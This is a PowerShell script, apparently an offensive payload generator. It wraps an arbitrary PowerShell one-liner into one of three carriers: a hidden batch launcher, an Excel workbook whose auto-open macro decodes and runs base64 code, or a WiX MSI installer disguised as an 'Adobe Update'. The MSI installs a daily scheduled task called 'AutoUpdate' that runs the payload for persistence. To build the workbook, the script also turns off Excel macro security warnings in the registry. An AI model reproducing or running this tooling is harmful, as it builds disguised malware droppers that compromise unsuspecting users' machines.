

[CmdletBinding()]
Param(
[Parameter(Mandatory=$True)]
[string]$OneLiner,
[Parameter(Mandatory=$False)]
[string]$WixPath,
[Parameter(Mandatory=$True)]
[string]$Type,
[Parameter(Mandatory=$False)]
[switch]$Base64,
[Parameter(Mandatory=$True)]
[string]$OutFile,
[Parameter(Mandatory=$False)]
[string]$XlsFile
)

Function Convert-ToBase64($Text){
$Text = [System.Text.Encoding]::Unicode.GetBytes($Text)
$Text =[Convert]::ToBase64String($Text)
$text
}


Function batch($OneLiner){
$line = 'powershell.exe -NoP -NonI -W Hidden invoke-command -scriptblock ' +  '"' + '{' + $OneLiner + '}' + '"'
$line|out-string| Out-file -encoding ASCII $OutFile
}

Function Macro($OneLiner){
echo here
$line = 'Sub Workbook_Open()'
$line
$line|Out-file -encoding ASCII $OutFile
$line = 'Dim str As String'
$line|Out-file -append -encoding ASCII $OutFile
$line = 'Dim exec As String'
$line|Out-file -append -encoding ASCII $OutFile
if(!$Base64.ISPresent){$OneLiner = Convert-ToBase64 $OneLiner}
$code = [regex]::split($OneLiner, '(.{48})') | ? {$_}
$count = 0
foreach($line in $code){
if($count -eq 0){
$out = 'str = "' + $line + '"'
$out = $out|out-string
echo "$out"|out-file -NoNewline -append -encoding ASCII $OutFile

$count = 1
}else{
'str = str + "' + $line + '"'|Out-file -append -encoding ASCII $OutFile


}}

$line = {exec = "powershell.exe -NoP -NonI -W Hidden -command"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {exec = exec + " ""$code = '""" "&" str "&" """'|out-string;"}
$line = $line -replace '"&"', '&'
$line| Out-file -encoding ASCII -append $OutFile
$line = {exec = exec + "$asc = [System.Text.Encoding]::"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {exec = exec + "Unicode.GetString([System.Convert]::"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {exec = exec + "FromBase64String($code));"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {exec = exec + "$asc;"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {exec = exec + "invoke-expression ""$asc"" "}
$line| Out-file -encoding ASCII -append $OutFile
$line = {Shell (exec)}
$line| Out-file -encoding ASCII -append $OutFile
$line = 'End Sub'
$line| Out-file -encoding ASCII -append $OutFile
}

Function MSILESS255($OneLiner){

$line = {<?xml version="1.0"?>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Adobe Update" Version="0.0.1" Manufacturer="Adobe Software" Language="1033">}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Package InstallerVersion="200" Compressed="yes" InstallPrivileges="limited" Comments="Windows Installer Package"/>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Directory Id="TARGETDIR" Name="SourceDir">}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222"/>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Directory> }
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Feature Id="DefaultFeature" Level="1">}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<ComponentRef Id="ApplicationFiles"/>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Feature>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<CustomAction Id="RegisterPSCmd"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {Property="RegisterPowerShellProperty"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {Value="&quot;C:\Windows\System32\SCHTASKS.EXE&quot; /CREATE /NP /F /TN AutoUpdate /SC DAILY /TR &quot;powershell.exe -E _ONELINER_&quot; "}
if(!$Base64.ISPresent){$OneLiner = Convert-ToBase64 $OneLiner}
$oneliner
$line = $line -replace '_ONELINER_', $OneLiner
$line| Out-file -encoding ASCII -append $OutFile
$line = {Execute="immediate" /> }
$line| Out-file -encoding ASCII -append $OutFile
$line = {<CustomAction Id="RegisterPowerShellProperty"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {BinaryKey="WixCA"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {DllEntry="CAQuietExec64"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {Execute="deferred"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {Return="ignore"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {Impersonate="no" />}
$line| Out-file -encoding ASCII -append $OutFile
#Run
$line = {<CustomAction Id="RunTask" }
$line| out-file -encoding ASCII -append $Outfile
$line = {Property="RegisterRunTask"}
$line| out-file -encoding ASCII -append $Outfile
$line = {Value="&quot;C:\Windows\System32\SCHTASKS.EXE&quot; /RUN /TN AutoUpdate " }
$line| out-file -encoding ASCII -append $Outfile
$line = {Execute="immediate" /> }
$line| out-file -encoding ASCII -append $Outfile
$line = {<CustomAction Id="RegisterRunTask"}
$line| out-file -encoding ASCII -append $Outfile
$line = {BinaryKey="WixCA"}
$line| out-file -encoding ASCII -append $Outfile
$line = {DllEntry="CAQuietExec64"}
$line| out-file -encoding ASCII -append $Outfile
$line = {Execute="deferred"}
$line| out-file -encoding ASCII -append $Outfile
$line = {Return="ignore"}
$line| out-file -encoding ASCII -append $Outfile
$line = {Impersonate="no" />}
$line| out-file -encoding ASCII -append $Outfile
#done
$line = {<InstallExecuteSequence>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Custom Action="RegisterPSCmd" After="CostFinalize">NOT  Installed</Custom>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Custom Action="RegisterPowerShellProperty" After="InstallFiles">NOT Installed</Custom>}
$line| Out-file -encoding ASCII -append $OutFile
#Run

$line = {<Custom Action="RunTask" After="CostFinalize">NOT  Installed</Custom>}
$line| out-file -encoding ASCII -append $Outfile
$line = {<Custom Action="RegisterRunTask" After="InstallFiles">NOT Installed</Custom>}
$line| out-file -encoding ASCII -append $Outfile
#end
$line = {</InstallExecuteSequence>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Product>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Wix>}
$line| Out-file -encoding ASCII -append $OutFile
}

FUNCTION MSIGT255($OneLiner){

$line = {<?xml version='1.0' encoding='windows-1252'?>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Wix xmlns='http://schemas.microsoft.com/wix/2006/wi'>} 
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Product Name='Adobe Updater' Id='B109A3DB-85C7-4930-9F39-4913298FBB0A' }
$line| Out-file -encoding ASCII -append $OutFile
$line = {UpgradeCode='5E9629F7-2299-4CB2-9DE9-5DBB46C1A8E3' Language='1033' }
$line| Out-file -encoding ASCII -append $OutFile
$line = {Codepage='1252' Version='1.0.0' Manufacturer='Adobe'>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Package Id='*' Keywords='Installer' Description="Adobe Updater installer" InstallPrivileges="limited"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {Comments='Adobe Inc' Manufacturer='Adobe Inc' InstallerVersion='100' Languages='1033' Compressed='yes' SummaryCodepage='1252' />}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Media Id='1' Cabinet='Sample.cab' EmbedCab='yes' DiskPrompt='CD-ROM #1' />}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Property Id='DiskPrompt' Value="Adobe Updater" />}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Directory Id='TARGETDIR' Name='SourceDir'>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Directory Id="LocalAppDataFolder" Name="AppData">}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Directory Id='Adobe' Name='Adobe'>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Directory Id='INSTALLDIR' Name='Adobe'>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Component Id='MainExecutable' Guid='3948E0F1-BF20-4620-81D8-EE5867C4F96F'>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<File Id='code.txt' Name='code.txt' DiskId='1' Source='code.txt' KeyPath='yes'>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</File>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Component>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Directory>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Directory>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Directory>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Directory>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Feature Id='Complete' Level='1'>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<ComponentRef Id='MainExecutable' />}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Feature>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<CustomAction Id="RegisterPSCmd" }
$line| Out-file -encoding ASCII -append $OutFile
$line = {Property="RegisterPowerShellProperty"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {Value="&quot;C:\Windows\System32\SCHTASKS.EXE&quot; /CREATE /NP /F /TN AutoUpdate /SC DAILY /TR &quot;Powershell $code = (get-content $env:localappdata\adobe\adobe\code.txt);Powershell -E $code&quot; " }
$line| Out-file -encoding ASCII -width 10000 -append $OutFile
$line = {Execute="immediate" /> }
$line| Out-file -encoding ASCII -append $OutFile
$line = {<CustomAction Id="RegisterPowerShellProperty"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {BinaryKey="WixCA"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {DllEntry="CAQuietExec64"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {Execute="deferred"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {Return="ignore"}
$line| Out-file -encoding ASCII -append $OutFile
$line = {Impersonate="no" />}
$line| Out-file -encoding ASCII -append $OutFile
#new
$line = {<CustomAction Id="RunTask" }
$line| out-file -encoding ASCII -append $Outfile
$line = {Property="RegisterRunTask"}
$line| out-file -encoding ASCII -append $Outfile
$line = {Value="&quot;C:\Windows\System32\SCHTASKS.EXE&quot; /RUN /TN AutoUpdate " }
$line| out-file -encoding ASCII -append $Outfile
$line = {Execute="immediate" /> }
$line| out-file -encoding ASCII -append $Outfile
$line = {<CustomAction Id="RegisterRunTask"}
$line| out-file -encoding ASCII -append $Outfile
$line = {BinaryKey="WixCA"}
$line| out-file -encoding ASCII -append $Outfile
$line = {DllEntry="CAQuietExec64"}
$line| out-file -encoding ASCII -append $Outfile
$line = {Execute="deferred"}
$line| out-file -encoding ASCII -append $Outfile
$line = {Return="ignore"}
$line| out-file -encoding ASCII -append $Outfile
$line = {Impersonate="no" />}
$line| out-file -encoding ASCII -append $Outfile
#done
$line = {<InstallExecuteSequence>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Custom Action="RegisterPSCmd" After="CostFinalize">NOT  Installed</Custom>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {<Custom Action="RegisterPowerShellProperty" After="InstallFiles">NOT Installed</Custom>}
$line| Out-file -encoding ASCII -append $OutFile
#new
$line = {<Custom Action="RunTask" After="CostFinalize">NOT  Installed</Custom>}
$line| out-file -encoding ASCII -append $Outfile
$line = {<Custom Action="RegisterRunTask" After="InstallFiles">NOT Installed</Custom>}
$line| out-file -encoding ASCII -append $Outfile
#done
$line = {</InstallExecuteSequence>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Product>}
$line| Out-file -encoding ASCII -append $OutFile
$line = {</Wix>}
$line| Out-file -encoding ASCII -append $OutFile
if(!$Base64.ISPresent){$OneLiner = Convert-ToBase64 $OneLiner}
$var = (get-childitem $OutFile).DirectoryName
$Oneliner| Out-file -encoding ASCII $var\code.txt
}

FUNCTION msiselect($Oneliner){
if($Oneliner.length -ge '200'){echo 'OneLiner Greater than 255';MSIGT255 $OneLiner}
else {echo 'OneLiner Less Thank 255';MSILESS255 $OneLiner}
}

Function RunWix(){
$candle = $wixpath + '\candle.exe -I ' + $Outfile
$light = $wixpath + '\light.exe -ext ' + $wixpath + '\WixUtilExtension.dll ' + $outfile.split('.')[0] + '.wixobj'
invoke-expression -command $candle
invoke-expression -command $light

}

If($Type -eq 'batch'){batch $OneLiner}
ElseIf($Type -eq 'macro'){macro $OneLiner}
ElseIf($Type -eq 'msi'){$OutFile = $Outfile.Split('.')[0] + '.wxs';if($WixPath){echo wixgood;msiselect $OneLiner;runwix}else {echo 'Need to set -WixPath to point to Wix Binaries when creating an MSI' }}
Else{Write-Host "Type Must be batch, macro, or MSI"}

IF($Type -eq 'macro'){



#Create excel document

$code= get-content $OutFile|out-string

$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null


$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)
$ExcelModule = $Workbook01.VBProject.VBComponents.Item("ThisWorkBook")
$ExcelModule.CodeModule.AddFromString($code)
#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$file = (get-location).path + '\' + $XlsFile
$Workbook01.SaveAs("$file", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"
#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security optional I leave it off for testing
#New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
#New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}